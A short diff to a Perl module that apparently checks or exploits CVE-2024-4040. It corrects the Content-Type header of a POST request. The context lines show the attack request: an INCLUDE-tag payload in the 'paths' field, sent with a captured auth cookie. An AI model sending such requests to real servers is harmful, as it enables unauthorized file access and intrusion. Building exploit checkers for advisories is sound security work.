@@ -40,7 +40,7 @@ package Spellbook::Advisory::CVE_2024_4040 {
 
             if ($cookies =~ /currentAuth=([^;]+)/msx) {                
                 $response = $userAgent -> post($endpoint, 
-                    Content_Type => "application/msx-www-form-urlencoded", 
+                    Content_Type => "application/x-www-form-urlencoded", 
                     Content => "command=exists&paths=<INCLUDE>$payload</INCLUDE>&c2f=$1"
                 );
                 
